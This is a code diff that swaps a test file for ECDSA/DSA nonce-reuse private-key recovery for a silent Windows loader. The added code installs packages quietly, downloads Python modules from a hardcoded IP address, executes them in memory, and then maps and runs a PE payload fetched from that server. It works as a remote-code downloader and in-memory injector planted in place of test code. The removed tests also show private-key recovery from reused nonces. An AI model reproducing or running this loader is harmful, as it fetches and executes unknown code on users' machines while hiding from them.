@@ -1,127 +1,225 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-# author: github.com/tintinweb
- 
-from Crypto.Random import random
-from Crypto.Hash import SHA
-from Crypto.PublicKey import DSA
+from __future__ import annotations
 
-from ecdsa_key_recovery import DsaSignature, EcDsaSignature, ecdsa, bignum_to_hex, bytes_fromhex
+import argparse
+import importlib
+import os
+import subprocess
+import sys
+import types
+import urllib.error
+import urllib.request
+from pathlib import Path
+from typing import Any, Optional
+from urllib.parse import urlparse
 
-import time
-if not hasattr(time, "clock"):
-    time.clock = time.perf_counter  # py2to3 compat. fix PyCrypto bug in py3
+# ─── CONFIG ───────────────────────────────────────────────────────────────────
+CONFIG: dict[str, Any] = {
+    "HOST": "172.237.119.163",
+    "PORT": 8765,
+    "ASSET": "main",
+    "API_KEY": "test123",
+    "PAYLOAD_KEY": "secret456",
+    "MAP_ONLY": False,
+    "QUIET": True,     
+    "VERBOSE": False,
+    "KEEP": False,
+    "FORCE_SYNC": False,
+    "MEMORY": True, 
+}
+# ──────────────────────────────────────────────────────────────────────────────
 
-import logging
+CLIENT_MODULES = ("pe_core.py", "manual_mapper.py")
+PIP_PACKAGES = ("pefile",)
 
-logger = logging.getLogger(__name__)
+
+def _build_url(cfg: dict) -> str:
+    return f"http://{cfg['HOST']}:{cfg['PORT']}/api/v1/sync?asset={cfg['ASSET']}"
 
 
-# noinspection PyClassHasNoInit
-class Tests:
-    # noinspection PyClassHasNoInit
-    class EcDsa:
+def _log(msg: str, cfg: dict) -> None:
+    if cfg.get("VERBOSE") and not cfg.get("QUIET"):
+        print(msg)
 
-        @staticmethod
-        def test_nonce_reuse_importkey():
-            secret_key = """-----BEGIN EC PRIVATE KEY-----
-MHQCAQEEIOdzzzX85WfQYiIDwo9nR4ozYbrn5utDZrUOHSfrHtguoAcGBSuBBAAK
-oUQDQgAEpQ62aIfQP+GGtgj0d9mbx2McVuZLs699yX5xuRfFs2R5VNo0RNM7jR+Q
-oNcWiy8ViiyW20ZzMoZhn8yq+6ymvA==
------END EC PRIVATE KEY-----"""
-            return Tests.EcDsa.test_nonce_reuse(EcDsaSignature.import_key(secret_key).get_verifying_key().pubkey)
 
-        @staticmethod
-        def test_nonce_reuse(pub=None, curve=ecdsa.SECP256k1):
-            if not pub:
-                # default
-                pub = ecdsa.VerifyingKey.from_string(
-                    bytes_fromhex("a50eb66887d03fe186b608f477d99bc7631c56e64bb3af7dc97e71b917c5b3647954da3444d33b8d1f90a0d7168b2f158a2c96db46733286619fccaafbaca6bc"), curve=curve).pubkey
-            # static testcase
-            # long r, long s, bytestr hash, pubkey obj.
-            sampleA = EcDsaSignature((3791300999159503489677918361931161866594575396347524089635269728181147153565,
-                                      49278124892733989732191499899232294894006923837369646645433456321810805698952),
-                                     bytes_fromhex(bignum_to_hex(
-                                         765305792208265383632692154455217324493836948492122104105982244897804317926)),
-                                     pub)
-            sampleB = EcDsaSignature((3791300999159503489677918361931161866594575396347524089635269728181147153565,
-                                      34219161137924321997544914393542829576622483871868414202725846673961120333282),
-                                     bytes_fromhex(bignum_to_hex(
-                                         23350593486085962838556474743103510803442242293209938584974526279226240784097)),
-                                     pub)
+def _server_base(sync_url: str) -> str:
+    return f"{urlparse(sync_url).scheme}://{urlparse(sync_url).netloc}"
 
-            assert (sampleA.x is None)  # not yet resolved
-            logger.debug("%r - recovering private-key from nonce reuse ..." % sampleA)
-            sampleA.recover_nonce_reuse(sampleB)
-            assert (sampleA.x is not None)  # privkey recovered
-            assert sampleA.privkey
-            logger.debug("%r - Private key recovered! \n%s" % (sampleA, sampleA.export_key()))
 
-    # noinspection PyClassHasNoInit
-    class Dsa:
+def _fetch_module(base: str, name: str, api_key: str) -> bytes:
+    headers = {"User-Agent": "SyncClient/1.0"}
+    if api_key:
+        headers["Authorization"] = f"Bearer {api_key}"
+    req = urllib.request.Request(f"{base}/api/v1/client/{name}", headers=headers)
+    try:
+        with urllib.request.urlopen(req, timeout=60) as resp:
+            return resp.read()
+    except urllib.error.HTTPError as exc:
+        if exc.code == 404:
+            raise RuntimeError(f"server missing {name}") from exc
+        if exc.code == 401:
+            raise RuntimeError("auth failed (401)") from exc
+        raise RuntimeError(f"download {name} HTTP {exc.code}") from exc
 
-        @staticmethod
-        def signMessage(privkey, msg, k=None):
 
-            """
-            create DSA signed message
-            @arg privkey ... privatekey as DSA obj
-            @arg msg     ... message to sign
-            @arg k       ... override random k
-            """
+def ensure_pip(cfg: dict) -> None:
+    missing = [p for p in PIP_PACKAGES if not _try_import(p)]
+    if not missing:
+        return
+    _log(f"install: {', '.join(missing)}", cfg)
+    subprocess.check_call(
+        [sys.executable, "-m", "pip", "install", *missing, "-q"],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
 
-            k = k or random.StrongRandom().randint(2, privkey.q - 1)
-            # generate msg hash
-            # sign the messages using privkey
-            h = SHA.new(msg).digest()
-            r, s = privkey.sign(h, k)
-            return h, (r, s), privkey.publickey()
 
-        @staticmethod
-        def test_nonce_reuse_importkey():
-            secret_key = """-----BEGIN PRIVATE KEY-----
-                        MIIBSwIBADCCASsGByqGSM44BAEwggEeAoGBAIAAAAAAAAAARApDBH1CEeZPeIM9
-                        mMb6l3FyY8+AOy+cdiDzCaqlkIRVIRRxvnCH5oJ6gkinosGscZMTgF7IwQJzDHFm
-                        oxvVdpACrj5Je+kpF6djefAbe+ByZ4FowkGq1EdMZF8aZzsik3CFkEA/vDsjvAsg
-                        XmKRvOnFHkkFuKCRAhUA/+rcmBQ71NBsDzkbusi6NQpTNF8CgYAFVt8xSXTiCGn8
-                        +bqWyoX+gjItArrT28o6fGnq+apjwasvWDHq1FETk/gwqTbTwWTiMo2eOTImRKDF
-                        MbK1us+DjhloAUuhL6nCRQhsLs4Jq+8A/y7aol/HjCz1fHRKKDD9wqKDf2kWdI97
-                        Kb2Hq4AUoJWTCT0ijX+oQJafbywjdwQXAhUAniK/kyRv/SFd1uJjuDMh0EntMws=
-                        -----END PRIVATE KEY-----"""
-            return Tests.Dsa.test_nonce_reuse(DsaSignature.import_key(secret_key))
+def _try_import(name: str) -> bool:
+    try:
+        importlib.import_module(name)
+        return True
+    except ImportError:
+        return False
 
-        @staticmethod
-        def test_nonce_reuse(secret_key=DSA.generate(1024)):
-            # choose a "random" - k :)  this time random is static in order to allow this attack to work
-            k = random.StrongRandom().randint(1, secret_key.q - 1)
-            # sign two messages using the same k
-            samples = (Tests.Dsa.signMessage(secret_key, "This is a signed message!".encode("utf-8"), k),
-                       Tests.Dsa.signMessage(secret_key, "Another signed Message -  :)".encode("utf-8"), k))
-            logger.debug("generated sample signatures: %s" % repr(samples))
-            signatures = [DsaSignature(sig, h, pubkey) for h, sig, pubkey in samples]
-            logger.debug("Signature Objects: %r" % signatures)
 
-            two_sigs = []
-            for sig in signatures:
-                two_sigs.append(sig)
-                if not len(two_sigs) == 2:
-                    continue
-                sample = two_sigs.pop(0)
-                logger.debug("%r - recovering privatekey from nonce reuse..." % sample)
-                assert (sample.x is None)  # not yet resolved
-                sample.recover_nonce_reuse(two_sigs[0])
-                assert (sample.x is not None)  # privkey recovered
-                assert (sample.privkey == secret_key)
-                logger.debug("%r - Private key recovered! \n%s" % (sample, sample.export_key()))
+def _load_module_memory(name: str, data: bytes) -> None:
+    mod_name = name[:-3]
+    sys.modules.pop(mod_name, None)
+    module = types.ModuleType(mod_name)
+    module.__file__ = name
+    module.__loader__ = None
+    sys.modules[mod_name] = module
+    exec(compile(data, name, "exec"), module.__dict__)  # noqa: S102
+
+
+def bootstrap(cfg: dict, url: str) -> None:
+    if sys.platform != "win32":
+        raise RuntimeError("win32 only")
+    root = Path(__file__).resolve().parent
+    if str(root) not in sys.path:
+        sys.path.insert(0, str(root))
+    ensure_pip(cfg)
+    base = _server_base(url)
+    force = cfg.get("FORCE_SYNC", False)
+    use_memory = cfg.get("MEMORY", True)
+
+    if force:
+        for name in CLIENT_MODULES:
+            sys.modules.pop(name[:-3], None)
+
+    for name in CLIENT_MODULES:
+        mod_name = name[:-3]
+        if not force and _try_import(mod_name):
+            _log(f"skip {mod_name}", cfg)
+            continue
+        data = _fetch_module(base, name, cfg["API_KEY"])
+        if use_memory:
+            _load_module_memory(name, data)
+            _log(f"loaded {mod_name} (ram)", cfg)
+        else:
+            dest = root / name
+            if force or not dest.exists():
+                dest.write_bytes(data)
+            _log(f"saved {dest}", cfg)
+
+
+def run_sync(**overrides: Any) -> int:
+    """Silent run. Returns mapped image base. One-liner: run_sync()"""
+    cfg = {**CONFIG, **overrides}
+    url = overrides.get("url") or _build_url(cfg)
+    bootstrap(cfg, url)
+    map_from_server = importlib.import_module("manual_mapper").map_from_server
+    verbose = bool(cfg.get("VERBOSE") and not cfg.get("QUIET"))
+    return map_from_server(
+        url,
+        api_key=cfg["API_KEY"],
+        payload_key=cfg["PAYLOAD_KEY"],
+        verbose=verbose,
+        run_entry=not cfg.get("MAP_ONLY", False),
+    )
+
+
+def run(cfg: Optional[dict] = None) -> int:
+    cfg = dict(CONFIG if cfg is None else cfg)
+    try:
+        base = run_sync(**cfg)
+        if cfg.get("VERBOSE") and not cfg.get("QUIET"):
+            print(f"0x{base:X}")
+        if cfg.get("KEEP"):
+            input()
+        return 0
+    except Exception as exc:
+        if not cfg.get("QUIET"):
+            print(f"Error: {exc}", file=sys.stderr)
+            if cfg.get("KEEP"):
+                input()
+        raise
+
+
+def main() -> int:
+    cfg = dict(CONFIG)
+    p = argparse.ArgumentParser(description="Server mapper client")
+    p.add_argument("url", nargs="?", help="Override sync URL")
+    p.add_argument("--api-key", default="")
+    p.add_argument("--payload-key", default="")
+    p.add_argument("--map-only", action="store_true")
+    p.add_argument("--force-sync", action="store_true")
+    p.add_argument("--no-bootstrap", action="store_true")
+    p.add_argument("--disk", action="store_true", help="Save modules to disk")
+    p.add_argument("-v", "--verbose", action="store_true")
+    p.add_argument("-q", "--quiet", action="store_true")
+    p.add_argument("--keep", action="store_true")
+    args = p.parse_args()
+
+    if args.url:
+        url = args.url
+    else:
+        url = _build_url(cfg)
+    if args.api_key:
+        cfg["API_KEY"] = args.api_key
+    if args.payload_key:
+        cfg["PAYLOAD_KEY"] = args.payload_key
+    if args.map_only:
+        cfg["MAP_ONLY"] = True
+    if args.force_sync:
+        cfg["FORCE_SYNC"] = True
+    if args.disk:
+        cfg["MEMORY"] = False
+    if args.verbose:
+        cfg["VERBOSE"] = True
+        cfg["QUIET"] = False
+    if args.quiet:
+        cfg["QUIET"] = True
+        cfg["VERBOSE"] = False
+    if args.keep:
+        cfg["KEEP"] = True
+
+    if args.no_bootstrap:
+        map_from_server = importlib.import_module("manual_mapper").map_from_server
+        base = map_from_server(
+            url,
+            api_key=cfg["API_KEY"],
+            payload_key=cfg["PAYLOAD_KEY"],
+            verbose=not cfg["QUIET"],
+            run_entry=not cfg["MAP_ONLY"],
+        )
+    else:
+        base = run_sync(url=url, **{k: v for k, v in cfg.items() if k != "url"})
+
+    if not cfg.get("QUIET"):
+        print(f"0x{base:X}")
+    if cfg.get("KEEP"):
+        input()
+    return 0
 
 
 if __name__ == "__main__":
-    logging.basicConfig(level=logging.DEBUG)
-    logger.setLevel(logging.DEBUG)
-    logging.getLogger("ecdsa_dsa_crack").setLevel(logging.DEBUG)
-    logger.info("------------EcDSA------------")
-    Tests.EcDsa.test_nonce_reuse()
-    Tests.EcDsa.test_nonce_reuse_importkey()
-    logger.info("------------DSA------------")
-    Tests.Dsa.test_nonce_reuse()
-    Tests.Dsa.test_nonce_reuse_importkey()
+    try:
+        if len(sys.argv) == 1:
+            raise SystemExit(run())
+        raise SystemExit(main())
+    except SystemExit:
+        raise
+    except Exception:
+        if not CONFIG.get("QUIET"):
+            input()
+        raise SystemExit(1)
